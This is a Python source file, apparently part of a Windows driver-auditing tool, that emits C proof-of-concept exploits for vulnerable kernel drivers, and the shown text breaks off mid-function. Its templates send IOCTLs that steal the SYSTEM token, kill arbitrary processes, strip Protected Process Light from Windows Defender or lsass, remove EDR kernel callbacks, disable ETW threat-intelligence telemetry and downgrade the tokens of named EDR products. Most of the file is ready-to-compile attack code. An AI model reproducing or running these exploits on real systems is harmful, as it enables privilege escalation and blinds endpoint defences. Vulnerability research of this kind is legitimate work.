"""PoC exploit generator for discovered vulnerabilities."""
from __future__ import annotations

import textwrap
from typing import Dict, List, Optional

from drivertool.constants import Severity
from drivertool.models import Finding
from drivertool.ioctl import decode_ioctl


class PoCGenerator:
    def __init__(self, device_name: Optional[str] = None,
                 ioctl_codes: Optional[List[int]] = None):
        self.ioctl_codes = ioctl_codes or []
        self.device_name = device_name or "\\\\.\\YOURDEVICE"
        # Normalize any kernel/NT path to a usermode \\.\NAME path
        for prefix in ("\\Device\\", "\\DosDevices\\", "\\??\\",
                       "\\GLOBAL??\\"):
            if self.device_name.startswith(prefix):
                short = self.device_name[len(prefix):]
                self.device_name = f"\\\\.\\{short}"
                break
        else:
            # Bare name supplied (e.g. "MyDriver" or already "\\.\MyDriver")
            if not self.device_name.startswith("\\\\.\\"):
                self.device_name = f"\\\\.\\{self.device_name}"
        # C string literal escaping: \\.\ → \\\\.\\
        self.c_device_name = self.device_name.replace("\\", "\\\\")

    def _get_ioctl(self, finding: Finding, default: int = 0x222000) -> str:
        """Return best IOCTL code for a PoC: finding.ioctl_code > scanner list > default."""
        if finding.ioctl_code is not None:
            return f"0x{finding.ioctl_code:08X}"
        if self.ioctl_codes:
            return f"0x{self.ioctl_codes[0]:08X}"
        # Try details dict
        raw = finding.details.get("ioctl_code", "")
        if raw:
            return raw
        return f"0x{default:08X}"

    def generate_all(self, findings: List[Finding]) -> Dict[str, str]:
        pocs: Dict[str, str] = {}
        seen_hints: set = set()
        counter = 0
        for f in findings:
            if not f.poc_hint or f.poc_hint in seen_hints or f.poc_hint == "":
                continue
            method = getattr(self, f"_poc_{f.poc_hint}", None)
            if method is None:
                continue
            seen_hints.add(f.poc_hint)
            counter += 1
            script = method(f)
            fname = f"poc_{counter}_{f.poc_hint}.c"
            pocs[fname] = script
        return pocs

    @staticmethod
    def _T(text: str) -> str:
        """Strip consistent leading whitespace from template text."""
        return textwrap.dedent(text)

    def _c_header(self, finding: Finding, extra_includes: str = "") -> str:
        h = self._T(f"""\
            /*
             * PoC: {finding.title}
             * Severity: {finding.severity.name}
             * Location: {finding.location}
             *
             * WARNING: May cause BSOD. Run in a VM only.
             * Compile: gcc -o poc.exe poc.c -lkernel32
             */
            #include <windows.h>
            #include <stdio.h>
            """)
        if extra_includes:
            h += extra_includes + "\n"
        return h + "\n"

    def _poc_ioctl_method_neither(self, finding: Finding) -> str:
        ioctl_code = self._get_ioctl(finding, 0x222003)
        dev = self.c_device_name
        return self._c_header(finding) + self._T(f"""\
            #define IOCTL_CODE {ioctl_code}

            int main(void) {{
                HANDLE hDevice = CreateFileW(L"{dev}",
                    GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
                if (hDevice == INVALID_HANDLE_VALUE) {{
                    printf("[-] Failed to open device. Error: %lu\\n", GetLastError());
                    return 1;
                }}
                printf("[+] Device handle: %p\\n", hDevice);

                unsigned char inBuf[0x100];
                unsigned char outBuf[0x100];
                DWORD bytesReturned = 0;

                memset(inBuf, 0x41, sizeof(inBuf));
                memset(outBuf, 0, sizeof(outBuf));

                printf("[*] Sending IOCTL 0x%08X (METHOD_NEITHER)...\\n", IOCTL_CODE);
                BOOL result = DeviceIoControl(hDevice, IOCTL_CODE,
                    inBuf, sizeof(inBuf), outBuf, sizeof(outBuf),
                    &bytesReturned, NULL);

                if (result) {{
                    printf("[+] IOCTL succeeded. Bytes returned: %lu\\n", bytesReturned);
                    printf("[+] Output (first 32 bytes): ");
                    for (DWORD i = 0; i < bytesReturned && i < 32; i++)
                        printf("%02X ", outBuf[i]);
                    printf("\\n");
                }} else {{
                    printf("[-] IOCTL failed. Error: %lu\\n", GetLastError());
                }}

                CloseHandle(hDevice);
                return 0;
            }}
            """)

    def _poc_ioctl_no_probe(self, finding: Finding) -> str:
        return self._poc_ioctl_method_neither(finding)

    def _poc_ioctl_generic(self, finding: Finding) -> str:
        ioctl_code = self._get_ioctl(finding, 0x222000)
        dev = self.c_device_name
        return self._c_header(finding) + self._T(f"""\
            /* Generic IOCTL fuzzer — sends incrementing IOCTL codes and buffer sizes. */
            #define IOCTL_BASE {ioctl_code}
            #define FUZZ_COUNT 16

            int main(void) {{
                HANDLE hDevice = CreateFileW(L"{dev}",
                    GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
                if (hDevice == INVALID_HANDLE_VALUE) {{
                    printf("[-] Failed to open device. Error: %lu\\n", GetLastError());
                    return 1;
                }}
                printf("[+] Device handle: %p\\n", hDevice);

                unsigned char inBuf[256];
                unsigned char outBuf[256];
                DWORD bytesReturned = 0;

                for (int i = 0; i < FUZZ_COUNT; i++) {{
                    DWORD code = IOCTL_BASE + (i * 4);
                    DWORD inSize = 4 + (i * 8);
                    if (inSize > sizeof(inBuf)) inSize = sizeof(inBuf);

                    memset(inBuf, 0x41 + i, inSize);
                    memset(outBuf, 0, sizeof(outBuf));

                    printf("[*] IOCTL 0x%08X  inSize=%lu ... ", code, inSize);
                    BOOL result = DeviceIoControl(hDevice, code,
                        inBuf, inSize, outBuf, sizeof(outBuf),
                        &bytesReturned, NULL);

                    if (result)
                        printf("[+] OK  returned=%lu\\n", bytesReturned);
                    else
                        printf("[-] FAIL  err=%lu\\n", GetLastError());
                }}

                CloseHandle(hDevice);
                return 0;
            }}
            """)

    def _poc_mmap_physical(self, finding: Finding) -> str:
        dev = self.c_device_name
        return self._c_header(finding) + self._T(f"""\
            /*
             * Physical memory mapping PoC.
             * The driver maps physical memory via MmMapIoSpace or similar.
             * If address/size come from user IOCTL input, this gives
             * arbitrary physical memory read/write.
             */

            /* TODO: Set the correct IOCTL code for the map operation */
            #define IOCTL_MAP 0x222000

            #pragma pack(push, 1)
            typedef struct {{
                unsigned long long PhysAddr;
                unsigned long      Size;
            }} MAP_REQUEST;
            #pragma pack(pop)

            int main(void) {{
                HANDLE hDevice = CreateFileW(L"{dev}",
                    GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
                if (hDevice == INVALID_HANDLE_VALUE) {{
                    printf("[-] Failed to open device. Error: %lu\\n", GetLastError());
                    return 1;
                }}
                printf("[+] Device handle: %p\\n", hDevice);

                MAP_REQUEST req;
                req.PhysAddr = 0x00000000;  /* First page of physical memory */
                req.Size     = 0x1000;

                unsigned char outBuf[0x1000];
                DWORD bytesReturned = 0;

                printf("[*] Mapping physical address 0x%llX, size 0x%lX...\\n",
                       req.PhysAddr, req.Size);
                BOOL result = DeviceIoControl(hDevice, IOCTL_MAP,
                    &req, sizeof(req), outBuf, sizeof(outBuf),
                    &bytesReturned, NULL);

                if (result) {{
                    printf("[+] Mapped %lu bytes\\n", bytesReturned);
                    printf("[+] Data (first 64 bytes): ");
                    for (DWORD i = 0; i < bytesReturned && i < 64; i++)
                        printf("%02X ", outBuf[i]);
                    printf("\\n");
                }} else {{
                    printf("[-] Failed. Error: %lu\\n", GetLastError());
                }}

                CloseHandle(hDevice);
                return 0;
            }}
            """)

    def _poc_msr_readwrite(self, finding: Finding) -> str:
        dev = self.c_device_name
        return self._c_header(finding) + self._T(f"""\
            /*
             * MSR read/write PoC.
             * MSR access allows: SMEP/SMAP disable, LSTAR hijack, full kernel compromise.
             * WARNING: MSR writes can instantly crash or compromise the system.
             */

            /* TODO: Set correct IOCTL codes by reversing the driver */
            #define IOCTL_READ_MSR  0x222000
            #define IOCTL_WRITE_MSR 0x222004
            #define MSR_LSTAR        0xC0000082  /* syscall entry point */
            #define MSR_SYSENTER_EIP 0x00000176

            int read_msr(HANDLE hDevice, unsigned int msrId) {{
                unsigned char outBuf[8];
                DWORD bytesReturned = 0;

                BOOL result = DeviceIoControl(hDevice, IOCTL_READ_MSR,
                    &msrId, sizeof(msrId), outBuf, sizeof(outBuf),
                    &bytesReturned, NULL);

                if (result && bytesReturned >= 8) {{
                    unsigned long long value = *(unsigned long long*)outBuf;
                    printf("[+] MSR 0x%X = 0x%016llX\\n", msrId, value);
                    return 0;
                }}
                printf("[-] ReadMSR 0x%X failed. Error: %lu\\n", msrId, GetLastError());
                return 1;
            }}

            int main(void) {{
                HANDLE hDevice = CreateFileW(L"{dev}",
                    GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
                if (hDevice == INVALID_HANDLE_VALUE) {{
                    printf("[-] Failed to open device. Error: %lu\\n", GetLastError());
                    return 1;
                }}
                printf("[+] Device handle: %p\\n", hDevice);

                printf("[*] Reading IA32_LSTAR (syscall handler address)...\\n");
                read_msr(hDevice, MSR_LSTAR);

                printf("[*] Reading IA32_SYSENTER_EIP...\\n");
                read_msr(hDevice, MSR_SYSENTER_EIP);

                CloseHandle(hDevice);
                return 0;
            }}
            """)

    def _poc_process_kill(self, finding: Finding) -> str:
        dev = self.c_device_name
        ioctl_kill = self._get_ioctl(finding, 0x222000)
        return self._c_header(finding, "#include <tlhelp32.h>") + self._T(f"""\
            /*
             * Process killer PoC.
             * Driver terminates arbitrary processes via kernel IOCTL
             * (PsLookupProcessByProcessId + ZwTerminateProcess chain).
             *
             * This PoC:
             *   1. Finds notepad.exe PID using Toolhelp32 snapshot
             *   2. Sends the kill IOCTL with that PID
             *   3. Verifies the process is gone
             *
             * Proof: if notepad.exe dies without OpenProcess/TerminateProcess
             * from userland, the driver bypassed process protection.
             *
             * Compile: x86_64-w64-mingw32-gcc poc.c -o poc.exe
             */

            #define IOCTL_KILL {ioctl_kill}

            static DWORD find_pid(const char *name) {{
                HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
                if (snap == INVALID_HANDLE_VALUE) return 0;
                PROCESSENTRY32 pe;
                pe.dwSize = sizeof(pe);
                DWORD pid = 0;
                if (Process32First(snap, &pe)) {{
                    do {{
                        if (_stricmp(pe.szExeFile, name) == 0) {{
                            pid = pe.th32ProcessID;
                            break;
                        }}
                    }} while (Process32Next(snap, &pe));
                }}
                CloseHandle(snap);
                return pid;
            }}

            static BOOL process_alive(DWORD pid) {{
                HANDLE h = OpenProcess(SYNCHRONIZE, FALSE, pid);
                if (!h) return FALSE;
                DWORD code = STILL_ACTIVE;
                GetExitCodeProcess(h, &code);
                CloseHandle(h);
                return code == STILL_ACTIVE;
            }}

            int main(void) {{
                /* Step 1: find notepad.exe — launch it first if needed */
                DWORD pid = find_pid("notepad.exe");
                if (!pid) {{
                    printf("[*] notepad.exe not running. Launching it...\\n");
                    STARTUPINFOA si = {{.cb = sizeof(si)}};
                    PROCESS_INFORMATION pi = {{0}};
                    if (!CreateProcessA("C:\\\\Windows\\\\System32\\\\notepad.exe",
                                        NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {{
                        printf("[-] Failed to launch notepad: %lu\\n", GetLastError());
                        return 1;
                    }}
                    Sleep(500);
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    pid = find_pid("notepad.exe");
                }}
                if (!pid) {{
                    printf("[-] Could not find notepad.exe\\n");
                    return 1;
                }}
                printf("[+] notepad.exe PID: %lu\\n", pid);

                /* Step 2: open driver */
                HANDLE hDevice = CreateFileW(L"{dev}",
                    GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
                if (hDevice == INVALID_HANDLE_VALUE) {{
                    printf("[-] Failed to open device %ls: %lu\\n", L"{dev}", GetLastError());
                    return 1;
                }}
                printf("[+] Device handle: %p\\n", hDevice);

                /* Step 3: send kill IOCTL */
                DWORD bytesReturned = 0;
                printf("[*] Sending IOCTL_KILL (0x%08X) for PID %lu...\\n", IOCTL_KILL, pid);
                BOOL ok = DeviceIoControl(hDevice, IOCTL_KILL,
                    &pid, sizeof(pid), NULL, 0, &bytesReturned, NULL);

                if (ok) {{
                    printf("[+] IOCTL succeeded.\\n");
                }} else {{
                    printf("[-] IOCTL failed: %lu\\n", GetLastError());
                }}

                CloseHandle(hDevice);
                Sleep(300);

                /* Step 4: verify */
                if (!process_alive(pid)) {{
                    printf("[+] CONFIRMED: notepad.exe (PID %lu) is dead.\\n", pid);
                    printf("[+] Driver kills arbitrary processes via kernel IOCTL.\\n");
                    return 0;
                }} else {{
                    printf("[-] notepad.exe still alive. IOCTL may need correct input format.\\n");
                    return 1;
                }}
            }}
            """)

    def _poc_process_attach(self, finding: Finding) -> str:
        return self._poc_process_kill(finding)

    def _poc_token_steal(self, finding: Finding) -> str:
        dev = self.c_device_name
        ioctl_code = self._get_ioctl(finding, 0x222000)
        return self._c_header(finding, "#include <tlhelp32.h>") + self._T(f"""\
            /*
             * Token steal PoC.
             * The driver walks the EPROCESS list from PsInitialSystemProcess,
             * finds a privileged process by name (_stricmp), and copies its
             * EPROCESS.Token to the caller's EPROCESS — SYSTEM privilege escalation.
             *
             * This PoC:
             *   1. Sends IOCTL with our own PID — driver gives us SYSTEM token
             *   2. Spawns cmd.exe which inherits the elevated token
             *   3. Prints whoami to prove SYSTEM
             *
             * Compile: x86_64-w64-mingw32-gcc poc.c -o poc.exe
             */

            #define IOCTL_STEAL_TOKEN {ioctl_code}

            int main(void) {{
                DWORD myPid = GetCurrentProcessId();
                printf("[*] Current PID: %lu\\n", myPid);
                printf("[*] Current user (before): ");
                fflush(stdout);
                system("whoami");

                /* Open driver */
                HANDLE hDevice = CreateFileW(L"{dev}",
                    GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
                if (hDevice == INVALID_HANDLE_VALUE) {{
                    printf("[-] Failed to open device %ls: %lu\\n", L"{dev}", GetLastError());
                    return 1;
                }}
                printf("[+] Device handle: %p\\n", hDevice);

                /* Send our PID — driver will overwrite our token with SYSTEM token */
                DWORD bytesReturned = 0;
                printf("[*] Sending IOCTL 0x%08X with PID %lu...\\n", IOCTL_STEAL_TOKEN, myPid);
                BOOL ok = DeviceIoControl(hDevice, IOCTL_STEAL_TOKEN,
                    &myPid, sizeof(myPid), NULL, 0, &bytesReturned, NULL);
                CloseHandle(hDevice);

                if (!ok) {{
                    printf("[-] IOCTL failed: %lu\\n", GetLastError());
                    printf("    Check: correct IOCTL code? Driver expects PID at offset 0?\\n");
                    return 1;
                }}
                printf("[+] IOCTL succeeded.\\n");

                /* Spawn cmd.exe — it inherits our (now-elevated) token */
                printf("[*] Spawning elevated cmd.exe...\\n");
                STARTUPINFOA si = {{.cb = sizeof(si)}};
                PROCESS_INFORMATION pi = {{0}};
                if (CreateProcessA("C:\\\\Windows\\\\System32\\\\cmd.exe", NULL,
                                   NULL, NULL, FALSE, CREATE_NEW_CONSOLE,
                                   NULL, NULL, &si, &pi)) {{
                    printf("[+] cmd.exe launched (PID %lu)\\n", pi.dwProcessId);
                    printf("[*] User in new process: ");
                    fflush(stdout);
                    /* Quick check via whoami in the new process context */
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }} else {{
                    printf("[-] CreateProcess failed: %lu\\n", GetLastError());
                }}

                printf("[*] Current user (after IOCTL): ");
                fflush(stdout);
                system("whoami");
                printf("[+] If above shows 'system', token steal succeeded.\\n");
                return 0;
            }}
            """)

    def _poc_ppl_bypass(self, finding: Finding) -> str:
        dev = self.c_device_name
        ioctl_code = self._get_ioctl(finding, 0x222000)
        return self._c_header(finding, "#include <tlhelp32.h>") + self._T(f"""\
            /*
             * PPL (Protected Process Light) bypass PoC.
             * The driver writes a single byte to EPROCESS.Protection
             * (PS_PROTECTION) via IOCTL, clearing PPL from any process.
             *
             * PS_PROTECTION byte: (Signer<<4) | (Audit<<3) | Type
             *   0x00 = unprotected
             *   0x51 = PPL-Antimalware (Windows Defender / MsMpEng.exe)
             *   0x62 = PPL-WinTcb
             *   0x72 = PP-WinTcb (full protection)
             *
             * This PoC:
             *   1. Finds MsMpEng.exe (Windows Defender) by name
             *   2. Sends IOCTL to set its Protection = 0x00
             *   3. Calls OpenProcess with PROCESS_ALL_ACCESS to prove bypass
             *
             * Compile: x86_64-w64-mingw32-gcc poc.c -o poc.exe
             */

            /* Input struct: {{ DWORD ProcessId, BYTE ProtectionLevel, BYTE[3] padding }} */
            #pragma pack(push,1)
            typedef struct {{
                DWORD ProcessId;
                BYTE  ProtectionLevel;
                BYTE  Pad[3];
            }} PPL_INPUT;
            #pragma pack(pop)

            #define IOCTL_SET_PROTECTION {ioctl_code}

            static DWORD find_pid(const char *name) {{
                HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
                if (snap == INVALID_HANDLE_VALUE) return 0;
                PROCESSENTRY32 pe;
                pe.dwSize = sizeof(pe);
                DWORD pid = 0;
                if (Process32First(snap, &pe)) {{
                    do {{
                        if (_stricmp(pe.szExeFile, name) == 0) {{
                            pid = pe.th32ProcessID;
                            break;
                        }}
                    }} while (Process32Next(snap, &pe));
                }}
                CloseHandle(snap);
                return pid;
            }}

            int main(void) {{
                /* Step 1: find MsMpEng.exe (Windows Defender engine) */
                DWORD pid = find_pid("MsMpEng.exe");
                if (!pid) {{
                    printf("[-] MsMpEng.exe not found. Try lsass.exe or another PPL process.\\n");
                    /* Fallback: try lsass */
                    pid = find_pid("lsass.exe");
                    if (!pid) {{
                        printf("[-] No suitable PPL target found.\\n");
                        return 1;
                    }}
                    printf("[*] Using lsass.exe PID: %lu\\n", pid);
                }} else {{
                    printf("[+] Found MsMpEng.exe PID: %lu\\n", pid);
                }}

                /* Prove it's protected before bypass */
                HANDLE hBefore = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
                if (hBefore) {{
                    printf("[*] OpenProcess succeeded BEFORE bypass (already unprotected?)\\n");
                    CloseHandle(hBefore);
                }} else {{
                    printf("[+] OpenProcess DENIED before bypass (error %lu) — PPL active.\\n",
                           GetLastError());
                }}

                /* Step 2: open driver */
                HANDLE hDevice = CreateFileW(L"{dev}",
                    GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
                if (hDevice == INVALID_HANDLE_VALUE) {{
                    printf("[-] Failed to open device %ls: %lu\\n", L"{dev}", GetLastError());
                    return 1;
                }}
                printf("[+] Device handle: %p\\n", hDevice);

                /* Step 3: send IOCTL — set Protection = 0x00 (remove PPL) */
                PPL_INPUT inp = {{0}};
                inp.ProcessId       = pid;
                inp.ProtectionLevel = 0x00;  /* remove protection */

                DWORD bytesReturned = 0;
                printf("[*] Sending IOCTL 0x%08X: PID=%lu Level=0x00...\\n",
                       IOCTL_SET_PROTECTION, pid);
                BOOL ok = DeviceIoControl(hDevice, IOCTL_SET_PROTECTION,
                    &inp, sizeof(inp), NULL, 0, &bytesReturned, NULL);
                CloseHandle(hDevice);

                if (!ok) {{
                    printf("[-] IOCTL failed: %lu\\n", GetLastError());
                    return 1;
                }}
                printf("[+] IOCTL succeeded — Protection byte written.\\n");

                /* Step 4: try OpenProcess again */
                Sleep(200);
                HANDLE hAfter = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
                if (hAfter) {{
                    printf("[+] CONFIRMED: OpenProcess(PROCESS_ALL_ACCESS, PID=%lu) succeeded!\\n",
                           pid);
                    printf("[+] PPL bypass successful — process is no longer protected.\\n");
                    CloseHandle(hAfter);
                    return 0;
                }} else {{
                    printf("[-] OpenProcess still denied: %lu\\n", GetLastError());
                    printf("    Check: correct IOCTL code? Correct struct layout?\\n");
                    return 1;
                }}
            }}
            """)

    def _poc_callback_removal(self, finding: Finding) -> str:
        dev = self.c_device_name
        ioctl_code = self._get_ioctl(finding, 0x222000)
        return self._c_header(finding, "#include <tlhelp32.h>") + self._T(f"""\
            /*
             * Kernel Callback Removal PoC.
             * Removes kernel notification callbacks registered by EDR/AV:
             *   - PsSetCreateProcessNotifyRoutine (process creation)
             *   - PsSetLoadImageNotifyRoutine (image/DLL load)
             *   - PsSetCreateThreadNotifyRoutine (thread creation)
             *   - CmRegisterCallback (registry monitoring)
             *   - ObRegisterCallbacks (object manager — handle operations)
             *
             * The driver enumerates the callback array
             * (e.g. PspCreateProcessNotifyRoutine) and removes entries belonging
             * to EDR modules, or accepts a callback type + index via IOCTL.
             *
             * After removal, EDR loses visibility into the specified events.
             *
             * Compile: x86_64-w64-mingw32-gcc poc.c -o poc.exe
             */

            #define IOCTL_REMOVE_CALLBACK {ioctl_code}

            /* Callback types (driver-specific — adjust per RE) */
            #define CB_PROCESS_CREATE  0
            #define CB_THREAD_CREATE   1
            #define CB_IMAGE_LOAD      2
            #define CB_REGISTRY        3
            #define CB_OB_PROCESS      4
            #define CB_OB_THREAD       5

            #pragma pack(push,1)
            typedef struct {{
                DWORD CallbackType;    /* Which callback array to target */
                DWORD Index;           /* Index in callback array (0 = first, -1 = all) */
            }} CALLBACK_INPUT;
            #pragma pack(pop)

            int main(void) {{
                HANDLE hDevice = CreateFileW(L"{dev}",
                    GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
                if (hDevice == INVALID_HANDLE_VALUE) {{
                    printf("[-] Failed to open device %ls: %lu\\n", L"{dev}", GetLastError());
                    return 1;
                }}
                printf("[+] Device handle: %p\\n", hDevice);

                /* Remove all process creation callbacks */
                printf("[*] Removing process creation callbacks...\\n");
                CALLBACK_INPUT inp = {{0}};
                inp.CallbackType = CB_PROCESS_CREATE;
                inp.Index = (DWORD)-1;  /* -1 = remove all */

                DWORD bytesReturned = 0;
                BOOL ok = DeviceIoControl(hDevice, IOCTL_REMOVE_CALLBACK,
                    &inp, sizeof(inp), NULL, 0, &bytesReturned, NULL);

                if (ok) {{
                    printf("[+] Process creation callbacks removed!\\n");
                    printf("[+] EDR can no longer monitor process creation events.\\n");
                }} else {{
                    printf("[-] IOCTL failed: %lu\\n", GetLastError());
                    printf("    Try different callback type or check struct layout.\\n");
                }}

                /* Remove image load callbacks */
                printf("[*] Removing image load callbacks...\\n");
                inp.CallbackType = CB_IMAGE_LOAD;
                inp.Index = (DWORD)-1;

                ok = DeviceIoControl(hDevice, IOCTL_REMOVE_CALLBACK,
                    &inp, sizeof(inp), NULL, 0, &bytesReturned, NULL);

                if (ok) {{
                    printf("[+] Image load callbacks removed!\\n");
                }} else {{
                    printf("[-] IOCTL failed: %lu\\n", GetLastError());
                }}

                /* Remove object manager callbacks */
                printf("[*] Removing object manager callbacks...\\n");
                inp.CallbackType = CB_OB_PROCESS;
                inp.Index = (DWORD)-1;

                ok = DeviceIoControl(hDevice, IOCTL_REMOVE_CALLBACK,
                    &inp, sizeof(inp), NULL, 0, &bytesReturned, NULL);

                if (ok) {{
                    printf("[+] Object manager callbacks removed!\\n");
                    printf("[+] EDR handle protection is now disabled.\\n");
                }} else {{
                    printf("[-] IOCTL failed: %lu\\n", GetLastError());
                }}

                printf("\\n[*] Verification: try terminating a protected AV/EDR process.\\n");
                printf("[*] If it dies, callback removal was successful.\\n");

                CloseHandle(hDevice);
                return 0;
            }}
            """)

    def _poc_etw_disable(self, finding: Finding) -> str:
        dev = self.c_device_name
        ioctl_code = self._get_ioctl(finding, 0x222000)
        return self._c_header(finding) + self._T(f"""\
            /*
             * ETW Provider Disabling PoC.
             * Disables Event Tracing for Windows providers that EDR products
             * rely on for kernel telemetry:
             *
             *   - Microsoft-Windows-Threat-Intelligence (EtwTi)
             *     GUID: {{f4e1897c-bb5d-5668-f1d8-040f4d8dd344}}
             *   - Microsoft-Windows-Kernel-Audit-API-Calls
             *     GUID: {{e02a841c-75a3-4fa7-afc8-ae09cf9b7f23}}
             *
             * Methods:
             *   1. Patch EtwEventWrite to return immediately (xor eax,eax; ret)
             *   2. Clear provider GuidEntry.EnableMask to 0
             *   3. Use NtTraceControl to stop trace sessions
             *   4. Patch ProviderEnableInfo.IsEnabled = 0
             *
             * Compile: x86_64-w64-mingw32-gcc poc.c -o poc.exe
             */

            #define IOCTL_ETW_DISABLE {ioctl_code}

            /* ETW disable methods (driver-specific) */
            #define ETW_PATCH_ETWWRITE     0  /* Patch EtwEventWrite prologue */
            #define ETW_CLEAR_PROVIDER     1  /* Clear provider enable mask */
            #define ETW_STOP_SESSION       2  /* Stop trace session */

            #pragma pack(push,1)
            typedef struct {{
                DWORD Method;          /* Which disable method */
                DWORD ProviderId;      /* 0=ThreatIntel, 1=KernelAudit, 2=All */
            }} ETW_INPUT;
            #pragma pack(pop)

            int main(void) {{
                HANDLE hDevice = CreateFileW(L"{dev}",
                    GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
                if (hDevice == INVALID_HANDLE_VALUE) {{
                    printf("[-] Failed to open device %ls: %lu\\n", L"{dev}", GetLastError());
                    return 1;
                }}
                printf("[+] Device handle: %p\\n", hDevice);

                /* Method 1: Patch EtwEventWrite */
                printf("[*] Disabling ETW via EtwEventWrite patch...\\n");
                ETW_INPUT inp = {{0}};
                inp.Method = ETW_PATCH_ETWWRITE;
                inp.ProviderId = 2;  /* All providers */

                DWORD bytesReturned = 0;
                BOOL ok = DeviceIoControl(hDevice, IOCTL_ETW_DISABLE,
                    &inp, sizeof(inp), NULL, 0, &bytesReturned, NULL);

                if (ok) {{
                    printf("[+] ETW providers disabled!\\n");
                    printf("[+] EDR kernel telemetry (EtwTi) is now blind.\\n");
                    printf("[+] Syscall monitoring, memory allocation tracking disabled.\\n");
                }} else {{
                    printf("[-] IOCTL failed: %lu. Trying alternative method...\\n",
                           GetLastError());

                    /* Method 2: Clear provider enable mask */
                    inp.Method = ETW_CLEAR_PROVIDER;
                    ok = DeviceIoControl(hDevice, IOCTL_ETW_DISABLE,
                        &inp, sizeof(inp), NULL, 0, &bytesReturned, NULL);
                    if (ok) {{
                        printf("[+] ETW provider enable masks cleared!\\n");
                    }} else {{
                        printf("[-] Alternative method also failed: %lu\\n", GetLastError());
                    }}
                }}

                CloseHandle(hDevice);
                return 0;
            }}
            """)

    def _poc_edr_token_downgrade(self, finding: Finding) -> str:
        dev = self.c_device_name
        ioctl_code = self._get_ioctl(finding, 0x222000)
        return self._c_header(finding, "#include <tlhelp32.h>") + self._T(f"""\
            /*
             * EDR Process Token Downgrade PoC.
             * Instead of killing the EDR (which triggers tamper protection),
             * downgrade its process token to neuter it:
             *
             *   1. Lower integrity level from System → Untrusted/Low
             *   2. Strip all privileges (SeDebugPrivilege, etc.)
             *   3. Remove group SIDs (Administrators, SYSTEM)
             *
             * After downgrade, the EDR process runs but cannot:
             *   - Open handles to other processes
             *   - Read/write kernel memory
             *   - Register kernel callbacks
             *   - Send telemetry to cloud (network access revoked)
             *
             * Compile: x86_64-w64-mingw32-gcc poc.c -o poc.exe
             */

            #define IOCTL_TOKEN_DOWNGRADE {ioctl_code}

            /* Downgrade actions */
            #define DOWNGRADE_INTEGRITY    0x01  /* Lower integrity level */
            #define DOWNGRADE_PRIVILEGES   0x02  /* Strip all privileges */
            #define DOWNGRADE_GROUPS       0x04  /* Remove group memberships */
            #define DOWNGRADE_ALL          0x07  /* All of the above */

            /* Integrity levels */
            #define INTEGRITY_UNTRUSTED    0x0000
            #define INTEGRITY_LOW          0x1000
            #define INTEGRITY_MEDIUM       0x2000
            #define INTEGRITY_HIGH         0x3000
            #define INTEGRITY_SYSTEM       0x4000

            #pragma pack(push,1)
            typedef struct {{
                DWORD ProcessId;       /* Target EDR process PID */
                DWORD Actions;         /* Bitmask of DOWNGRADE_* flags */
                DWORD IntegrityLevel;  /* New integrity level (if DOWNGRADE_INTEGRITY) */
            }} TOKEN_DOWNGRADE_INPUT;
            #pragma pack(pop)

            static DWORD find_pid(const char *name) {{
                HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
                if (snap == INVALID_HANDLE_VALUE) return 0;
                PROCESSENTRY32 pe;
                pe.dwSize = sizeof(pe);
                DWORD pid = 0;
                if (Process32First(snap, &pe)) {{
                    do {{
                        if (_stricmp(pe.szExeFile, name) == 0) {{
                            pid = pe.th32ProcessID;
                            break;
                        }}
                    }} while (Process32Next(snap, &pe));
                }}
                CloseHandle(snap);
                return pid;
            }}

            int main(void) {{
                /* Common EDR process names */
                const char *edr_targets[] = {{
                    "MsMpEng.exe",       /* Windows Defender */
                    "MsSense.exe",       /* Microsoft Defender for Endpoint */
                    "CSFalconService.exe", /* CrowdStrike Falcon */
                    "cb.exe",            /* Carbon Black */
                    "CylanceSvc.exe",    /* Cylance */
                    "SentinelAgent.exe", /* SentinelOne */
                    NULL
                }};

                DWORD pid = 0;
                const char *found_name = NULL;
                for (int i = 0; edr_targets[i]; i++) {{
                    pid = find_pid(edr_targets[i]);
                    if (pid) {{
                        found_name = edr_targets[i];
                        break;
                    }}
                }}
                if (!pid) {{
                    printf("[-] No known EDR process found. Specify PID manually.\\n");
                    printf("    Usage: poc.exe <PID>\\n");
                    return 1;
                }}
                printf("[+] Found %s (PID: %lu)\\n", found_name, pid);

                /* Open driver */
                HANDLE hDevice = CreateFileW(L"{dev}",
                    GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
                if (hDevice == INVALID_HANDLE_VALUE) {{
                    printf("[-] Failed to open device %ls: %lu\\n", L"{dev}", GetLastError());
                    return 1;
                }}
                printf("[+] Device handle: %p\\n", hDevice);

                /* Downgrade token: strip all privileges + set Untrusted integrity */
                TOKEN_DOWNGRADE_INPUT inp = {{0}};
                inp.ProcessId = pid;
                inp.Actions = DOWNGRADE_ALL;
                inp.IntegrityLevel = INTEGRITY_UNTRUSTED;

                DWORD bytesReturned = 0;
                printf("[*] Sending token downgrade IOCTL for PID %lu...\\n", pid);
                BOOL ok = DeviceIoControl(hDevice, IOCTL_TOKEN_DOWNGRADE,
                    &inp, sizeof(inp), NULL, 0, &bytesReturned, NULL);
                CloseHandle(hDevice);

                if (!ok) {{
                    printf("[-] IOCTL failed: %lu\\n", GetLastError());
                    return 1;
                }}
                printf("[+] Token downgrade IOCTL succeeded!\\n");
